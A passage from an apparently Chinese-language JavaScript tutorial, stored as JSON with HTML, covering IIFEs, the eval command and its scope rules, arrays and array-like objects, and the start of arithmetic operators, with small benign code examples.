class=\"prettyprint language-javascript\"><code>(function(){ /* code */ }());\n// 或者\n(function(){ /* code */ })();</code></pre><p>上面两种写法都是以圆括号开头，引擎就会认为后面跟的是一个表示式，而不是函数定义语句，所以就避免了错误。这就叫做“立即调用的函数表达式”（Immediately-Invoked Function Expression），简称 IIFE。</p>\n<p>注意，上面两种写法最后的分号都是必须的。如果省略分号，遇到连着两个 IIFE，可能就会报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 报错\n(function(){ /* code */ }())\n(function(){ /* code */ }())</code></pre><p>上面代码的两行之间没有分号，JavaScript 会将它们连在一起解释，将第二行解释为第一行的参数。</p>\n<p>推而广之，任何让解释器以表达式来处理函数定义的方法，都能产生同样的效果，比如下面三种写法。</p>\n<pre class=\"prettyprint language-javascript\"><code>var i = function(){ return 10; }();\ntrue &amp;&amp; function(){ /* code */ }();\n0, function(){ /* code */ }();</code></pre><p>甚至像下面这样写，也是可以的。</p>\n<pre class=\"prettyprint language-javascript\"><code>!function () { /* code */ }();\n~function () { /* code */ }();\n-function () { /* code */ }();\n+function () { /* code */ }();</code></pre><p>通常情况下，只对匿名函数使用这种“立即执行的函数表达式”。它的目的有两个：一是不必为函数命名，避免了污染全局变量；二是 IIFE 内部形成了一个单独的作用域，可以封装一些外部无法读取的私有变量。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 写法一\nvar tmp = newData;\nprocessData(tmp);\nstoreData(tmp);\n\n// 写法二\n(function () {\n  var tmp = newData;\n  processData(tmp);\n  storeData(tmp);\n}());</code></pre><p>上面代码中，写法二比写法一更好，因为完全避免了污染全局变量。</p>\n\n        <h2>\n            <a href='#eval-命令' class='header-anchor'>#</a>\n            <span>eval 命令</span>\n        </h2>\n    \n        <h3>\n            <a href='#基本用法' class='header-anchor'>#</a>\n            <span>基本用法</span>\n        </h3>\n    <p><code>eval</code>命令接受一个字符串作为参数，并将这个字符串当作语句执行。</p>\n<pre class=\"prettyprint language-javascript\"><code>eval(&#039;var a = 1;&#039;);\na // 1</code></pre><p>上面代码将字符串当作语句运行，生成了变量<code>a</code>。</p>\n<p>如果参数字符串无法当作语句运行，那么就会报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>eval(&#039;3x&#039;) // Uncaught SyntaxError: Invalid or unexpected token</code></pre><p>放在<code>eval</code>中的字符串，应该有独自存在的意义，不能用来与<code>eval</code>以外的命令配合使用。举例来说，下面的代码将会报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>eval(&#039;return;&#039;); // Uncaught SyntaxError: Illegal return statement</code></pre><p>上面代码会报错，因为<code>return</code>不能单独使用，必须在函数中使用。</p>\n<p>如果<code>eval</code>的参数不是字符串，那么会原样返回。</p>\n<pre class=\"prettyprint language-javascript\"><code>eval(123) // 123</code></pre><p><code>eval</code>没有自己的作用域，都在当前作用域内执行，因此可能会修改当前作用域的变量的值，造成安全问题。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = 1;\neval(&#039;a = 2&#039;);\n\na // 2</code></pre><p>上面代码中，<code>eval</code>命令修改了外部变量<code>a</code>的值。由于这个原因，<code>eval</code>有安全风险。</p>\n<p>为了防止这种风险，JavaScript 规定，如果使用严格模式，<code>eval</code>内部声明的变量，不会影响到外部作用域。</p>\n<pre class=\"prettyprint language-javascript\"><code>(function f() {\n  &#039;use strict&#039;;\n  eval(&#039;var foo = 123&#039;);\n  console.log(foo);  // ReferenceError: foo is not defined\n})()</code></pre><p>上面代码中，函数<code>f</code>内部是严格模式，这时<code>eval</code>内部声明的<code>foo</code>变量，就不会影响到外部。</p>\n<p>不过，即使在严格模式下，<code>eval</code>依然可以读写当前作用域的变量。</p>\n<pre class=\"prettyprint language-javascript\"><code>(function f() {\n  &#039;use strict&#039;;\n  var foo = 1;\n  eval(&#039;foo = 2&#039;);\n  console.log(foo);  // 2\n})()</code></pre><p>上面代码中，严格模式下，<code>eval</code>内部还是改写了外部变量，可见安全风险依然存在。</p>\n<p>总之，<code>eval</code>的本质是在当前作用域之中，注入代码。由于安全风险和不利于 JavaScript 引擎优化执行速度，所以一般不推荐使用。通常情况下，<code>eval</code>最常见的场合是解析 JSON 数据的字符串，不过正确的做法应该是使用原生的<code>JSON.parse</code>方法。</p>\n\n        <h3>\n            <a href='#eval-的别名调用' class='header-anchor'>#</a>\n            <span>eval 的别名调用</span>\n        </h3>\n    <p>前面说过<code>eval</code>不利于引擎优化执行速度。更麻烦的是，还有下面这种情况，引擎在静态代码分析的阶段，根本无法分辨执行的是<code>eval</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var m = eval;\nm(&#039;var x = 1&#039;);\nx // 1</code></pre><p>上面代码中，变量<code>m</code>是<code>eval</code>的别名。静态代码分析阶段，引擎分辨不出<code>m(&#39;var x = 1&#39;)</code>执行的是<code>eval</code>命令。</p>\n<p>为了保证<code>eval</code>的别名不影响代码优化，JavaScript 的标准规定，凡是使用别名执行<code>eval</code>，<code>eval</code>内部一律是全局作用域。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = 1;\n\nfunction f() {\n  var a = 2;\n  var e = eval;\n  e(&#039;console.log(a)&#039;);\n}\n\nf() // 1</code></pre><p>上面代码中，<code>eval</code>是别名调用，所以即使它是在函数中，它的作用域还是全局作用域，因此输出的<code>a</code>为全局变量。这样的话，引擎就能确认<code>e()</code>不会对当前的函数作用域产生影响，优化的时候就可以把这一行排除掉。</p>\n<p><code>eval</code>的别名调用的形式五花八门，只要不是直接调用，都属于别名调用，因为引擎只能分辨<code>eval()</code>这一种形式是直接调用。</p>\n<pre class=\"prettyprint language-javascript\"><code>eval.call(null, &#039;...&#039;)\nwindow.eval(&#039;...&#039;)\n(1, eval)(&#039;...&#039;)\n(eval, eval)(&#039;...&#039;)</code></pre><p>上面这些形式都是<code>eval</code>的别名调用，作用域都是全局作用域。</p>\n\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li>Ben Alman, <a href=\"http://benalman.com/news/2010/11/immediately-invoked-function-expression/\">Immediately-Invoked Function Expression (IIFE)</a></li>\n<li>Mark Daggett, <a href=\"http://markdaggett.com/blog/2013/02/15/functions-explained/\">Functions Explained</a></li>\n<li>Juriy Zaytsev, <a href=\"http://kangax.github.com/nfe/\">Named function expressions demystified</a></li>\n<li>Marco Rogers polotek, <a href=\"http://docs.nodejitsu.com/articles/javascript-conventions/what-is-the-arguments-object\">What is the arguments object?</a></li>\n<li>Juriy Zaytsev, <a href=\"http://perfectionkills.com/global-eval-what-are-the-options/\">Global eval. What are the options?</a></li>\n<li>Axel Rauschmayer, <a href=\"http://www.2ality.com/2014/01/eval.html\">Evaluating JavaScript code via eval() and new Function()</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"数据类型","link":"javascript:void(0)"},{"title":"数组","link":"/types/array.html"}],"content":"\n        <h1>\n            <a href='#数组' class='header-anchor'>#</a>\n            <span>数组</span>\n        </h1>\n    \n        <h2>\n            <a href='#定义' class='header-anchor'>#</a>\n            <span>定义</span>\n        </h2>\n    <p>数组（array）是按次序排列的一组值。每个值的位置都有编号（从0开始），整个数组用方括号表示。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [&#039;a&#039;, &#039;b&#039;, &#039;c&#039;];</code></pre><p>上面代码中的<code>a</code>、<code>b</code>、<code>c</code>就构成一个数组，两端的方括号是数组的标志。<code>a</code>是0号位置，<code>b</code>是1号位置，<code>c</code>是2号位置。</p>\n<p>除了在定义时赋值，数组也可以先定义后赋值。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [];\n\narr[0] = &#039;a&#039;;\narr[1] = &#039;b&#039;;\narr[2] = &#039;c&#039;;</code></pre><p>任何类型的数据，都可以放入数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [\n  {a: 1},\n  [1, 2, 3],\n  function() {return true;}\n];\n\narr[0] // Object {a: 1}\narr[1] // [1, 2, 3]\narr[2] // function (){return true;}</code></pre><p>上面数组<code>arr</code>的3个成员依次是对象、数组、函数。</p>\n<p>如果数组的元素还是数组，就形成了多维数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [[1, 2], [3, 4]];\na[0][1] // 2\na[1][1] // 4</code></pre>\n        <h2>\n            <a href='#数组的本质' class='header-anchor'>#</a>\n            <span>数组的本质</span>\n        </h2>\n    <p>本质上，数组属于一种特殊的对象。<code>typeof</code>运算符会返回数组的类型是<code>object</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>typeof [1, 2, 3] // &quot;object&quot;</code></pre><p>上面代码表明，<code>typeof</code>运算符认为数组的类型就是对象。</p>\n<p>数组的特殊性体现在，它的键名是按次序排列的一组整数（0，1，2...）。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [&#039;a&#039;, &#039;b&#039;, &#039;c&#039;];\n\nObject.keys(arr)\n// [&quot;0&quot;, &quot;1&quot;, &quot;2&quot;]</code></pre><p>上面代码中，<code>Object.keys</code>方法返回数组的所有键名。可以看到数组的键名就是整数0、1、2。</p>\n<p>由于数组成员的键名是固定的（默认总是0、1、2...），因此数组不用为每个元素指定键名，而对象的每个成员都必须指定键名。JavaScript 语言规定，对象的键名一律为字符串，所以，数组的键名其实也是字符串。之所以可以用数值读取，是因为非字符串的键名会被转为字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [&#039;a&#039;, &#039;b&#039;, &#039;c&#039;];\n\narr[&#039;0&#039;] // &#039;a&#039;\narr[0] // &#039;a&#039;</code></pre><p>上面代码分别用数值和字符串作为键名，结果都能读取数组。原因是数值键名被自动转为了字符串。</p>\n<p>注意，这点在赋值时也成立。如果一个值总是先转成字符串，再进行赋值。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [];\n\na[1.00] = 6;\na[1] // 6</code></pre><p>上面代码中，由于<code>1.00</code>转成字符串是<code>1</code>，所以通过数字键<code>1</code>可以读取值。</p>\n<p>上一章说过，对象有两种读取成员的方法：点结构（<code>object.key</code>）和方括号结构（<code>object[key]</code>）。但是，对于数值的键名，不能使用点结构。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [1, 2, 3];\narr.0 // SyntaxError</code></pre><p>上面代码中，<code>arr.0</code>的写法不合法，因为单独的数值不能作为标识符（identifier）。所以，数组成员只能用方括号<code>arr[0]</code>表示（方括号是运算符，可以接受数值）。</p>\n\n        <h2>\n            <a href='#length-属性' class='header-anchor'>#</a>\n            <span>length 属性</span>\n        </h2>\n    <p>数组的<code>length</code>属性，返回数组的成员数量。</p>\n<pre class=\"prettyprint language-javascript\"><code>[&#039;a&#039;, &#039;b&#039;, &#039;c&#039;].length // 3</code></pre><p>JavaScript 使用一个32位整数，保存数组的元素个数。这意味着，数组成员最多只有 4294967295 个（2<sup>32</sup> - 1）个，也就是说<code>length</code>属性的最大值就是 4294967295。</p>\n<p>只要是数组，就一定有<code>length</code>属性。该属性是一个动态的值，等于键名中的最大整数加上<code>1</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [&#039;a&#039;, &#039;b&#039;];\narr.length // 2\n\narr[2] = &#039;c&#039;;\narr.length // 3\n\narr[9] = &#039;d&#039;;\narr.length // 10\n\narr[1000] = &#039;e&#039;;\narr.length // 1001</code></pre><p>上面代码表示，数组的数字键不需要连续，<code>length</code>属性的值总是比最大的那个整数键大<code>1</code>。另外，这也表明数组是一种动态的数据结构，可以随时增减数组的成员。</p>\n<p><code>length</code>属性是可写的。如果人为设置一个小于当前成员个数的值，该数组的成员会自动减少到<code>length</code>设置的值。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [ &#039;a&#039;, &#039;b&#039;, &#039;c&#039; ];\narr.length // 3\n\narr.length = 2;\narr // [&quot;a&quot;, &quot;b&quot;]</code></pre><p>上面代码表示，当数组的<code>length</code>属性设为2（即最大的整数键只能是1）那么整数键2（值为<code>c</code>）就已经不在数组中了，被自动删除了。</p>\n<p>清空数组的一个有效方法，就是将<code>length</code>属性设为0。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [ &#039;a&#039;, &#039;b&#039;, &#039;c&#039; ];\n\narr.length = 0;\narr // []</code></pre><p>如果人为设置<code>length</code>大于当前元素个数，则数组的成员数量会增加到这个值，新增的位置都是空位。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [&#039;a&#039;];\n\na.length = 3;\na[1] // undefined</code></pre><p>上面代码表示，当<code>length</code>属性设为大于数组个数时，读取新增的位置都会返回<code>undefined</code>。</p>\n<p>如果人为设置<code>length</code>为不合法的值，JavaScript 会报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 设置负值\n[].length = -1\n// RangeError: Invalid array length\n\n// 数组元素个数大于等于2的32次方\n[].length = Math.pow(2, 32)\n// RangeError: Invalid array length\n\n// 设置字符串\n[].length = &#039;abc&#039;\n// RangeError: Invalid array length</code></pre><p>值得注意的是，由于数组本质上是一种对象，所以可以为数组添加属性，但是这不影响<code>length</code>属性的值。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [];\n\na[&#039;p&#039;] = &#039;abc&#039;;\na.length // 0\n\na[2.1] = &#039;abc&#039;;\na.length // 0</code></pre><p>上面代码将数组的键分别设为字符串和小数，结果都不影响<code>length</code>属性。因为，<code>length</code>属性的值就是等于最大的数字键加1，而这个数组没有整数键，所以<code>length</code>属性保持为<code>0</code>。</p>\n<p>如果数组的键名是添加超出范围的数值，该键名会自动转为字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [];\narr[-1] = &#039;a&#039;;\narr[Math.pow(2, 32)] = &#039;b&#039;;\n\narr.length // 0\narr[-1] // &quot;a&quot;\narr[4294967296] // &quot;b&quot;</code></pre><p>上面代码中，我们为数组<code>arr</code>添加了两个不合法的数字键，结果<code>length</code>属性没有发生变化。这些数字键都变成了字符串键名。最后两行之所以会取到值，是因为取键值时，数字键名会默认转为字符串。</p>\n\n        <h2>\n            <a href='#in-运算符' class='header-anchor'>#</a>\n            <span>in 运算符</span>\n        </h2>\n    <p>检查某个键名是否存在的运算符<code>in</code>，适用于对象，也适用于数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [ &#039;a&#039;, &#039;b&#039;, &#039;c&#039; ];\n2 in arr  // true\n&#039;2&#039; in arr // true\n4 in arr // false</code></pre><p>上面代码表明，数组存在键名为<code>2</code>的键。由于键名都是字符串，所以数值<code>2</code>会自动转成字符串。</p>\n<p>注意，如果数组的某个位置是空位，<code>in</code>运算符返回<code>false</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [];\narr[100] = &#039;a&#039;;\n\n100 in arr // true\n1 in arr // false</code></pre><p>上面代码中，数组<code>arr</code>只有一个成员<code>arr[100]</code>，其他位置的键名都会返回<code>false</code>。</p>\n\n        <h2>\n            <a href='#for...in-循环和数组的遍历' class='header-anchor'>#</a>\n            <span>for...in 循环和数组的遍历</span>\n        </h2>\n    <p><code>for...in</code>循环不仅可以遍历对象，也可以遍历数组，毕竟数组只是一种特殊对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [1, 2, 3];\n\nfor (var i in a) {\n  console.log(a[i]);\n}\n// 1\n// 2\n// 3</code></pre><p>但是，<code>for...in</code>不仅会遍历数组所有的数字键，还会遍历非数字键。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [1, 2, 3];\na.foo = true;\n\nfor (var key in a) {\n  console.log(key);\n}\n// 0\n// 1\n// 2\n// foo</code></pre><p>上面代码在遍历数组时，也遍历到了非整数键<code>foo</code>。所以，不推荐使用<code>for...in</code>遍历数组。</p>\n<p>数组的遍历可以考虑使用<code>for</code>循环或<code>while</code>循环。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [1, 2, 3];\n\n// for循环\nfor(var i = 0; i &lt; a.length; i++) {\n  console.log(a[i]);\n}\n\n// while循环\nvar i = 0;\nwhile (i &lt; a.length) {\n  console.log(a[i]);\n  i++;\n}\n\nvar l = a.length;\nwhile (l--) {\n  console.log(a[l]);\n}</code></pre><p>上面代码是三种遍历数组的写法。最后一种写法是逆向遍历，即从最后一个元素向第一个元素遍历。</p>\n<p>数组的<code>forEach</code>方法，也可以用来遍历数组，详见《标准库》的 Array 对象一章。</p>\n<pre class=\"prettyprint language-javascript\"><code>var colors = [&#039;red&#039;, &#039;green&#039;, &#039;blue&#039;];\ncolors.forEach(function (color) {\n  console.log(color);\n});\n// red\n// green\n// blue</code></pre>\n        <h2>\n            <a href='#数组的空位' class='header-anchor'>#</a>\n            <span>数组的空位</span>\n        </h2>\n    <p>当数组的某个位置是空元素，即两个逗号之间没有任何值，我们称该数组存在空位（hole）。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [1, , 1];\na.length // 3</code></pre><p>上面代码表明，数组的空位不影响<code>length</code>属性。</p>\n<p>需要注意的是，如果最后一个元素后面有逗号，并不会产生空位。也就是说，有没有这个逗号，结果都是一样的。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [1, 2, 3,];\n\na.length // 3\na // [1, 2, 3]</code></pre><p>上面代码中，数组最后一个成员后面有一个逗号，这不影响<code>length</code>属性的值，与没有这个逗号时效果一样。</p>\n<p>数组的空位是可以读取的，返回<code>undefined</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [, , ,];\na[1] // undefined</code></pre><p>使用<code>delete</code>命令删除一个数组成员，会形成空位，并且不会影响<code>length</code>属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [1, 2, 3];\ndelete a[1];\n\na[1] // undefined\na.length // 3</code></pre><p>上面代码用<code>delete</code>命令删除了数组的第二个元素，这个位置就形成了空位，但是对<code>length</code>属性没有影响。也就是说，<code>length</code>属性不过滤空位。所以，使用<code>length</code>属性进行数组遍历，一定要非常小心。</p>\n<p>数组的某个位置是空位，与某个位置是<code>undefined</code>，是不一样的。如果是空位，使用数组的<code>forEach</code>方法、<code>for...in</code>结构、以及<code>Object.keys</code>方法进行遍历，空位都会被跳过。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [, , ,];\n\na.forEach(function (x, i) {\n  console.log(i + &#039;. &#039; + x);\n})\n// 不产生任何输出\n\nfor (var i in a) {\n  console.log(i);\n}\n// 不产生任何输出\n\nObject.keys(a)\n// []</code></pre><p>如果某个位置是<code>undefined</code>，遍历的时候就不会被跳过。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [undefined, undefined, undefined];\n\na.forEach(function (x, i) {\n  console.log(i + &#039;. &#039; + x);\n});\n// 0. undefined\n// 1. undefined\n// 2. undefined\n\nfor (var i in a) {\n  console.log(i);\n}\n// 0\n// 1\n// 2\n\nObject.keys(a)\n// [&#039;0&#039;, &#039;1&#039;, &#039;2&#039;]</code></pre><p>这就是说，空位就是数组没有这个元素，所以不会被遍历到，而<code>undefined</code>则表示数组有这个元素，值是<code>undefined</code>，所以遍历不会跳过。</p>\n\n        <h2>\n            <a href='#类似数组的对象' class='header-anchor'>#</a>\n            <span>类似数组的对象</span>\n        </h2>\n    <p>如果一个对象的所有键名都是正整数或零，并且有<code>length</code>属性，那么这个对象就很像数组，语法上称为“类似数组的对象”（array-like object）。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  0: &#039;a&#039;,\n  1: &#039;b&#039;,\n  2: &#039;c&#039;,\n  length: 3\n};\n\nobj[0] // &#039;a&#039;\nobj[1] // &#039;b&#039;\nobj.length // 3\nobj.push(&#039;d&#039;) // TypeError: obj.push is not a function</code></pre><p>上面代码中，对象<code>obj</code>就是一个类似数组的对象。但是，“类似数组的对象”并不是数组，因为它们不具备数组特有的方法。对象<code>obj</code>没有数组的<code>push</code>方法，使用该方法就会报错。</p>\n<p>“类似数组的对象”的根本特征，就是具有<code>length</code>属性。只要有<code>length</code>属性，就可以认为这个对象类似于数组。但是有一个问题，这种<code>length</code>属性不是动态值，不会随着成员的变化而变化。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  length: 0\n};\nobj[3] = &#039;d&#039;;\nobj.length // 0</code></pre><p>上面代码为对象<code>obj</code>添加了一个数字键，但是<code>length</code>属性没变。这就说明了<code>obj</code>不是数组。</p>\n<p>典型的“类似数组的对象”是函数的<code>arguments</code>对象，以及大多数 DOM 元素集，还有字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>// arguments对象\nfunction args() { return arguments }\nvar arrayLike = args(&#039;a&#039;, &#039;b&#039;);\n\narrayLike[0] // &#039;a&#039;\narrayLike.length // 2\narrayLike instanceof Array // false\n\n// DOM元素集\nvar elts = document.getElementsByTagName(&#039;h3&#039;);\nelts.length // 3\nelts instanceof Array // false\n\n// 字符串\n&#039;abc&#039;[1] // &#039;b&#039;\n&#039;abc&#039;.length // 3\n&#039;abc&#039; instanceof Array // false</code></pre><p>上面代码包含三个例子，它们都不是数组（<code>instanceof</code>运算符返回<code>false</code>），但是看上去都非常像数组。</p>\n<p>数组的<code>slice</code>方法可以将“类似数组的对象”变成真正的数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = Array.prototype.slice.call(arrayLike);</code></pre><p>除了转为真正的数组，“类似数组的对象”还有一个办法可以使用数组的方法，就是通过<code>call()</code>把数组的方法放到对象上面。</p>\n<pre class=\"prettyprint language-javascript\"><code>function print(value, index) {\n  console.log(index + &#039; : &#039; + value);\n}\n\nArray.prototype.forEach.call(arrayLike, print);</code></pre><p>上面代码中，<code>arrayLike</code>代表一个类似数组的对象，本来是不可以使用数组的<code>forEach()</code>方法的，但是通过<code>call()</code>，可以把<code>forEach()</code>嫁接到<code>arrayLike</code>上面调用。</p>\n<p>下面的例子就是通过这种方法，在<code>arguments</code>对象上面调用<code>forEach</code>方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>// forEach 方法\nfunction logArgs() {\n  Array.prototype.forEach.call(arguments, function (elem, i) {\n    console.log(i + &#039;. &#039; + elem);\n  });\n}\n\n// 等同于 for 循环\nfunction logArgs() {\n  for (var i = 0; i &lt; arguments.length; i++) {\n    console.log(i + &#039;. &#039; + arguments[i]);\n  }\n}</code></pre><p>字符串也是类似数组的对象，所以也可以用<code>Array.prototype.forEach.call</code>遍历。</p>\n<pre class=\"prettyprint language-javascript\"><code>Array.prototype.forEach.call(&#039;abc&#039;, function (chr) {\n  console.log(chr);\n});\n// a\n// b\n// c</code></pre><p>注意，这种方法比直接使用数组原生的<code>forEach</code>要慢，所以最好还是先将“类似数组的对象”转为真正的数组，然后再直接调用数组的<code>forEach</code>方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = Array.prototype.slice.call(&#039;abc&#039;);\narr.forEach(function (chr) {\n  console.log(chr);\n});\n// a\n// b\n// c</code></pre>\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li>Axel Rauschmayer, <a href=\"http://www.2ality.com/2012/12/arrays.html\">Arrays in JavaScript</a></li>\n<li>Axel Rauschmayer, <a href=\"http://www.2ality.com/2012/06/dense-arrays.html\">JavaScript: sparse arrays vs. dense arrays</a></li>\n<li>Felix Bohm, <a href=\"http://net.tutsplus.com/tutorials/javascript-ajax/what-they-didnt-tell-you-about-es5s-array-extras/\">What They Didn’t Tell You About ES5′s Array Extras</a></li>\n<li>Juriy Zaytsev, <a href=\"http://perfectionkills.com/how-ecmascript-5-still-does-not-allow-to-subclass-an-array/\">How ECMAScript 5 still does not allow to subclass an array</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"运算符","link":"javascript:void(0)"},{"title":"算术运算符","link":"/operators/arithmetic.html"}],"content":"\n        <h1>\n            <a href='#算术运算符' class='header-anchor'>#</a>\n            <span>算术运算符</span>\n        </h1>\n    <p>运算符是处理数据的基本方法，用来从现有的值得到新的值。JavaScript 提供了多种运算符，覆盖了所有主要的运算。</p>\n\n        <h2>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h2>\n    <p>JavaScript 共提供10个算术运算符，用来完成基本的算术运算。</p>\n<ul>\n<li><strong>加法运算符</strong>：<code>x + y</code></li>\n<li><strong>减法运算符</strong>： <code>x - y</code></li>\n<li><strong>乘法运算符</strong>： <code>x * y</code></li>\n<li><strong>除法运算符</strong>：<code>x / y</code></li>\n<li><strong>指数运算符</strong>：<code>x ** y</code></li>\n<li><strong>余数运算符</strong>：<code>x % y</code></li>\n<li><strong>自增运算符</strong>：<code>++x</code> 或者 <code>x++</code></li>\n<li><strong>自减运算符</strong>：<code>--x</code> 或者 <code>x--</code></li>\n<li><strong>数值运算符</strong>： <code>+x</code></li>\n<li><strong>负数值运算符</strong>：<code>-x</code></li>\n</ul>\n<p>减法、乘法、除法运算法比较单纯，就是执行相应的数学运算。下面介绍其他几个算术运算符，重点是加法运算符。</p>\n\n        <h2>\n            <a href='#加法运算符' class='header-anchor'>#</a>\n            <span>加法运算符</span>\n        </h2>\n    \n        <h3>\n            <a href='#基本规则' class='header-anchor'>#</a>\n            <span>基本规则</span>\n        </h3>\n    <p>加法运算符（<code>+</code>）是最常见的运算符，用来求两个数值的和。</p>\n<pre class=\"prettyprint language-javascript\"><code>1 + 1 // 2</code></pre><p>JavaScript 允许非数值的相加。</p>\n<pre class=\"prettyprint language-javascript\"><code>true + true // 2\n1 + true // 2</code></pre><p>上面代码中，第一行是两个布尔值相加，第二行是数值与布尔值相加。这两种情况，布尔值都会自动转成数值，然后再相加。</p>\n<p>比较特殊的是，如果是两个字符串相加，这时加法运算符会变成连接运算符，返回一个新的字符串，将两个原字符串连接在一起。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;a&#039; + &#039;bc&#039; // &quot;abc&quot;</code></pre><p>如果一个运算子是字符串，另一个运算子是非字符串，这时非字符串会转成字符串，再连接在一起。</p>\n<pre class=\"prettyprint language-javascript\"><code>1 + &#039;a&#039; // &quot;1a&quot;\nfalse + &#039;a&#039; // &quot;falsea&quot;</code></pre><p>加法运算符是在运行时决定，到底是执行相加，还是执行连接。也就是说，运算子的不同，导致了不同的语法行为，这种现象称为“重载”（overload）。由于加法运算符存在重载，可能执行两种运算，使用的时候必须很小心。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;3&#039; + 4 + 5 // &quot;345&quot;\n3 + 4 + &#039;5&#039; // &quot;75&quot;</code></pre><p>上面代码中，由于从左到右的运算次序，字符串的位置不同会导致不同的结果。</p>\n<p>除了加法运算符，其他算术运算符（比如减法、除法和乘法）都不会发生重载。它们的规则是：所有运算子一律转为数值，再进行相应的数学运算。</p>\n<pre class=\"prettyprint language-javascript\"><code>1 - &#039;2&#039; // -1\n1 * &#039;2&#039; // 2\n1 / &#039;2&#039; // 0.5</code></pre><p>上面代码中，减法、除法和乘法运算符，都是将字符串自动转为数值，然后再运算。</p>\n\n        <h3>\n            <a href='#对象的相加' class='header-anchor'>#</a>\n            <span>对象的相加</span>\n        </h3>\n    <p>如果运算子是对象，必须先转成原始类型的值，然后再相加。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = { p: 1 };\nobj + 2 // &quot;[object Object]2&quot;</code></pre><p>上面代码中，对象<code>obj</code>转成原始类型的值是<code>[object Object]</code>，再加<code>2</code>就得到了上面的结果。</p>\n<p>对象转成原始类型的值，规则如下。</p>\n<p>首先，自动调用对象的<code>valueOf</code>方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = { p: 1 };\nobj.valueOf() // { p: 1 }</code></pre><p>一般来说，对象的<code>valueOf</code>方法总是返回对象自身，这时再自动调用对象的<code>toString</code>方法，将其转为字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = { p: 1 };\nobj.valueOf().toString() // &quot;[object Object]&quot;</code></pre><p>对象的<code>toString</code>方法默认返回<code>[object Object]</code>，所以就得到了最前面那个例子的结果。</p>\n<p>知道了这个规则以后，就可以自己定义<code>valueOf</code>方法或<code>toString</code>方法，得到想要的结果。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  valueOf: function () {\n    return 1;\n  }\n};\n\nobj + 2 // 3</code></pre><p>上面代码中，我们定义<code>obj</code>对象的<code>valueOf</code>方法返回<code>1</code>，于是<code>obj + 2</code>就得到了<code>3</code>。这个例子中，由于<code>valueOf</code>方法直接返回一个原始类型的值，所以不再调用<code>toString</code>方法。</p>\n<p>下面是自定义<code>toString</code>方法的例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  toString: function () {\n    return &#039;hello&#039;;\n  }\n};\n\nobj + 2 // &quot;hello2&quot;</code></pre><p>上面代码中，对象<code>obj</code>的<code>toString</code>方法返回字符串<code>hello</code>。前面说过，只要有一个运算子是字符串，加法运算符就变成连接运算符，返回连接后的字符串。</p>\n<p>这里有一个特例，如果运算子是一个<code>Date</code>对象的实例，那么会优先执行<code>toString</code>方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = new Date();\nobj.valueOf = function () { return 1 };\nobj.toString = function () { return &#039;hello&#039; };\n\nobj + 2 // &quot;hello2&quot;</code></pre><p>上面代码中，对象<code>obj</code>是一个<code>Date</code>对象的实例，并且自定义了<code>valueOf</code>方法和<code>toString</code>方法，结果<code>toString</code>方法优先执行。</p>\n\n        <h2>\n            <a href='#余数运算符' class='header-anchor'>#</a>\n            <span>余数运算符</span>\n        </h2>\n    <p>余数运算符（<code>%</code>）返回前一个运算子被后一个运算子除，所得的余数。</p>\n<pre class=\"prettyprint language-javascript\"><code>12 % 5 // 2</code></pre><p>需要注意的是，运算结果的正负号由第一个运算子的正负号决定。</p>\n<pre class=\"prettyprint language-javascript\"><code>-1 % 2 // -1\n1 % -2 // 